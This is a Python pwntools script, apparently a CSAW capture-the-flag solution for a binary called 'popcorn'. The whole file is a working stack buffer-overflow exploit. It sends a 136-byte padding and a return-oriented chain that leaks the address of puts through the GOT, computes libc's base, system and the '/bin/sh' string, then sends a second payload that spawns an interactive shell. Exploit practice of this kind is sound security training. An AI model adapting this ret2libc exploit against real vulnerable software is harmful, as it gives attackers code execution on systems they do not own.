#!/usr/bin/env python3
from pwn import *

elf = ELF('./popcorn')
# p = remote('pwn.chal.csaw.io', 1006)
p = elf.process()
libc = ELF('./libc.so.6')

pop_rdi = 0x4011eb

payload = b'A' * 136 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])

p.sendlineafter('Would you like some popcorn?', payload)
p.recv()
leak = u64(p.recvuntil('\x7f') + b'\x00\x00')
print('puts@libc:', hex(leak))

libc.address = leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

payload = b'A' * 136 + p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendlineafter('Would you like some popcorn?', payload)

p.interactive()
